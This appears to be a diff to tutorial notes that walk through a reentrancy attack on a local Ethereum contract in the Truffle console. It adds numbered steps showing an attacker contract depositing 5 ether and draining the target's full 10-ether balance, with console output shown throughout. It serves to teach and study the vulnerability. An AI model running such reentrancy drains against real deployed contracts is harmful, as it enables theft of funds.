@@ -4,6 +4,7 @@ https://github.com/gustavoguimaraes/honeyPotReentranceAttack
 http://solidity.readthedocs.io/en/develop/contracts.html
 https://ethereum.stackexchange.com/questions/12778/how-to-send-some-amount-to-a-contract-in-truffle
 
+STEP 1 - Check our initial accounts balances
 truffle(develop)> Reentrant.deployed().then(instance => honeyPotAddress = instance.address)
 '0x9fbda871d559710256a2502a2517b794b482db40'
 truffle(develop)> ReentrantAttacker.deployed().then(instance => evilContractAddress = instance.address)
@@ -13,7 +14,7 @@ truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db4
 truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
 '0'
 
-Deposit 5 Ethers from a known account to Reentrant instance:
+STEP 2 - Deposit 5 Ethers from a known account to Reentrant instance:
 truffle(develop)> Reentrant.deployed().then(instance => instance.deposit({from: web3.eth.accounts[1], value: web3.toWei(5, "ether") }))
 If encounter Error: Invalid number of arguments to Solidity function, delete the contracts in .\build directory, compile and migrate again.
 
@@ -31,7 +32,7 @@ If encounter Error: Invalid number of arguments to Solidity function, delete the
 truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)                                     ))
 '5000000000000000000'
 
-ReentrantAttacker instance initially has zero balance:
+STEP 3 - Check withdraw count from Reentrant instance:
 truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
 '0'
 
@@ -39,7 +40,7 @@ Check the withdraw count from Reentrant instance:
 truffle(develop)> Reentrant.deployed().then(instance => instance.getWithdrawCount())
 BigNumber { s: 1, e: 0, c: [ 0 ] }
 
-Now invoke ReentrantAttacker attack function,
+STEP 4 - Now invoke ReentrantAttacker attack function,
 by just sending 5 ethers to deposit in Reentrant instance, and immediately calling withdraw from Reentrant instance,
 ReentrantAttacker instance can steal all Ethers (10) from Reentrant
 truffle(develop)> ReentrantAttacker.deployed().then(inst => inst.attack({ value: web3.toWei(5, "ether") }))
@@ -55,15 +56,21 @@ truffle(develop)> ReentrantAttacker.deployed().then(inst => inst.attack({ value:
      logs: [] },
   logs: [] }
 
-Check the withdraw count from Reentrant instance, it has been called twice:
+STEP 5 - Check the withdraw count from Reentrant instance = 1 + no. of recursive calls
 truffle(develop)> Reentrant.deployed().then(instance => instance.getWithdrawCount())
 BigNumber { s: 1, e: 0, c: [ 2 ] }
 
-ReentrantAttacker instance now
+STEP 5 - ReentrantAttacker instance now has deposit amount + amounts from Reentrant instance
 truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
 '10000000000000000000' !!!
 
 truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)                                     ))
 '0' !!
+
+Points to ponder:
+https://ethereum.stackexchange.com/questions/7069/whats-the-point-of-sending-a-value-in-a-contract-deployment-transaction
+https://ethereum.stackexchange.com/questions/26838/how-to-get-the-creator-of-a-contract-was-the-owner
+https://ethereum.stackexchange.com/questions/11484/how-can-contract-ownership-be-transferred-from-one-account-to-another
+
 
 
